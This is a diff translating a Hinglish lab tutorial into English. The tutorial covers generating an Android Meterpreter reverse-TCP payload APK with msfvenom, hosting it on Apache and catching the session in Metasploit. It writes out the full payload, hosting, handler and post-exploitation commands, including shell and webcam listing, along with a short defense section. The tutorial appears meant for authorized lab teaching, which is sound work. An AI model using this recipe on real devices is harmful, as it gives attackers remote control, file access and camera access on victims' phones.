@@ -1,34 +1,34 @@
 # 🛡️ Practical 3 – Android Reverse Shell (Metasploit + msfvenom)
 
-Aaj hum ek **basic Android penetration testing lab practical** samjhenge jisme:
+Today we will understand a **basic Android penetration testing lab practical** where we will:
 
-✔ Android payload generate karna
-✔ APK host karna using Apache server
-✔ Metasploit handler setup karna
-✔ Android Meterpreter session establish karna
+✔ Generate an Android payload
+✔ Host the APK using Apache server
+✔ Set up a Metasploit handler
+✔ Establish an Android Meterpreter session
 
-⚠️ Ye practical sirf **authorized lab environment (Kali + Android Emulator/Test Device)** ke liye hai.
+⚠️ This practical is only for an **authorized lab environment (Kali + Android Emulator/Test Device)**.
 
 ---
 
 # 1️⃣ Basic Concept 📌
 
-## 📌 Android Reverse Shell Kya Hota Hai?
+## 📌 What is an Android Reverse Shell?
 
-Android reverse shell me:
+In an Android reverse shell:
 
-👉 Android device attacker machine ko reverse connection bhejta hai.
+👉 The Android device sends a reverse connection to the attacker machine.
 
-Matlab:
+Meaning:
 
-* Kali Linux listener mode me wait karta hai
-* Android device khud connection initiate karta hai
+* Kali Linux waits in listener mode
+* Android device itself initiates the connection
 
 ---
 
 ## 🧠 Simple Flow
 
-```text id="l1kq8r"
+```text
 Attacker (Kali)  <------  Android Device / Emulator
       Listener          Reverse Connection
 ```
@@ -59,18 +59,18 @@ Examples:
 
 ## 📌 Check IP
 
-```bash id="kp38hb"
+```bash
 ip a
 ```
 
 Example:
 
-```text id="vscj0m"
+```text
 192.168.1.10
 ```
 
-👉 Ye attacker machine ka IP hai
-👉 Isko hum **LHOST** bolte hain.
+👉 This is the attacker machine's IP
+👉 This is what we call **LHOST**.
 
 ---
 
@@ -78,13 +78,13 @@ Example:
 
 ## 📌 Purpose
 
-Android APK generate karna jo execute hone par reverse Meterpreter session create kare.
+Generate an Android APK that creates a reverse Meterpreter session when executed.
 
 ---
 
 ## ⚙️ Command
 
-```bash id="jlwm0d"
+```bash
 msfvenom -p android/meterpreter/reverse_tcp \
 LHOST=192.168.1.10 \
 LPORT=4444 \
@@ -109,8 +109,8 @@ R > malicious.apk
 
 # 📌 Output
 
-✔ `malicious.apk` generate ho jata hai
-✔ Ye Android payload APK hota hai
+✔ `malicious.apk` is generated
+✔ This is the Android payload APK
 
 ---
 
@@ -118,13 +118,13 @@ R > malicious.apk
 
 ## 📌 Purpose
 
-APK ko host karna taaki Android device usko download kar sake.
+Host the APK so the Android device can download it.
 
 ---
 
 # 📁 Move APK to Web Directory
 
-```bash id="3ujh0t"
+```bash
 sudo mv malicious.apk /var/www/html/
 ```
 
@@ -132,7 +132,7 @@ sudo mv malicious.apk /var/www/html/
 
 # 🚀 Start Apache Server
 
-```bash id="7mxt6m"
+```bash
 sudo systemctl start apache2
 ```
 
@@ -140,7 +140,7 @@ sudo systemctl start apache2
 
 # 📌 Check Status
 
-```bash id="ehdt53"
+```bash
 sudo systemctl status apache2
 ```
 
@@ -148,13 +148,13 @@ sudo systemctl status apache2
 
 # 🌍 Access APK
 
-Browser me open karo:
+Open in browser:
 
-```text id="mbq0hc"
+```text
 http://192.168.1.10/malicious.apk
 ```
 
-Agar download start ho jaye → hosting successful.
+If download starts → hosting is successful.
 
 ---
 
@@ -162,7 +162,7 @@ Agar download start ho jaye → hosting successful.
 
 ## 📌 Open Framework
 
-```bash id="ql3k86"
+```bash
 msfconsole
 ```
 
@@ -172,7 +172,7 @@ msfconsole
 
 ## 📌 Use Multi Handler
 
-```bash id="2wg1b9"
+```bash
 use exploit/multi/handler
 ```
 
@@ -180,7 +180,7 @@ use exploit/multi/handler
 
 ## 📌 Set Payload
 
-```bash id="yzhqu6"
+```bash
 set payload android/meterpreter/reverse_tcp
 ```
 
@@ -188,11 +188,11 @@ set payload android/meterpreter/reverse_tcp
 
 ## 📌 Configure Network
 
-```bash id="tv7m7y"
+```bash
 set LHOST 192.168.1.10
 ```
 
-```bash id="7nrmj6"
+```bash
 set LPORT 4444
 ```
 
@@ -200,13 +200,13 @@ set LPORT 4444
 
 # 8️⃣ Start Listener ▶️
 
-```bash id="b0tpk0"
+```bash
 exploit
 ```
 
 or
 
-```bash id="81p3a3"
+```bash
 run
 ```
 
@@ -214,7 +214,7 @@ run
 
 # 📌 Status
 
-✔ Metasploit ab reverse connection ka wait karega.
+✔ Metasploit will now wait for the reverse connection.
 
 ---
 
@@ -222,9 +222,9 @@ run
 
 ## 📌 Android Emulator / Device
 
-Browser open karo:
+Open browser:
 
-```text id="r3nwrn"
+```text
 http://192.168.1.10/malicious.apk
 ```
 
@@ -232,12 +232,12 @@ http://192.168.1.10/malicious.apk
 
 ## 📌 Install APK
 
-Android install warning show karega.
+Android will show an installation warning.
 
-Agar lab environment hai to:
+If it's a lab environment:
 
-✔ “Install unknown apps” enable karo
-✔ APK install karo
+✔ Enable "Install unknown apps"
+✔ Install the APK
 
 ---
 
@@ -245,21 +245,21 @@ Agar lab environment hai to:
 
 ## 📌 Open Installed App
 
-APK install hone ke baad:
+After APK installation:
 
-✔ App open karo
+✔ Open the app
 
-Jaise hi app run hogi:
+As soon as the app runs:
 
-👉 Reverse connection Metasploit ko bheja jayega.
+👉 A reverse connection will be sent to Metasploit.
 
 ---
 
 # 1️⃣1️⃣ Session Establishment 🔗
 
-Agar successful hua:
+If successful:
 
-```text id="q5s0lx"
+```text
 Meterpreter session opened
 ```
 
@@ -269,7 +269,7 @@ Meterpreter session opened
 
 ## 📌 Device Info
 
-```bash id="cgrlgm"
+```bash
 sysinfo
 ```
 
@@ -277,7 +277,7 @@ sysinfo
 
 ## 📌 Shell Access
 
-```bash id="4pjlwm"
+```bash
 shell
 ```
 
@@ -285,7 +285,7 @@ shell
 
 ## 📌 Current App/User
 
-```bash id="9pnf5e"
+```bash
 getuid
 ```
 
@@ -293,7 +293,7 @@ getuid
 
 ## 📌 File Listing
 
-```bash id="5r04mf"
+```bash
 ls
 ```
 
@@ -301,7 +301,7 @@ ls
 
 ## 📌 Webcam / Camera List
 
-```bash id="1lv8y9"
+```bash
 webcam_list
 ```
 
@@ -309,7 +309,7 @@ webcam_list
 
 # 📌 Overall Attack Flow Summary 🔥
 
-```text id="61p4v5"
+```text
 1. Find Kali IP
 2. Generate Android APK payload
 3. Move APK to Apache directory
@@ -348,7 +348,7 @@ webcam_list
 
 # 📌 Defense Methods
 
-✔ Don’t install unknown APKs
+✔ Don't install unknown APKs
 ✔ Keep Play Protect enabled
 ✔ Use trusted app stores
 ✔ Review permissions carefully
@@ -369,21 +369,21 @@ webcam_list
 # 🎯 Interview Questions
 
 ✔ What is Android Meterpreter?
-✔ Why reverse TCP used?
-✔ Why APK installation warning appears?
+✔ Why is reverse TCP used?
+✔ Why does the APK installation warning appear?
 ✔ Difference between Android APK and Linux ELF?
-✔ Why same payload must match handler?
+✔ Why must the payload match the handler?
 
 ---
 
 # 🏁 Final Thought
 
-Ye practical Android penetration testing ka foundational concept hai:
+This practical is a foundational concept of Android penetration testing:
 
 👉 APK payload generation
 👉 Reverse TCP communication
 👉 Meterpreter session handling
 👉 Android app execution model
 
-Agar ye clear ho gaya →
-Advanced Android exploitation aur mobile security concepts easy ho jate hain 🔥
+If this is clear →
+Advanced Android exploitation and mobile security concepts become easier 🔥
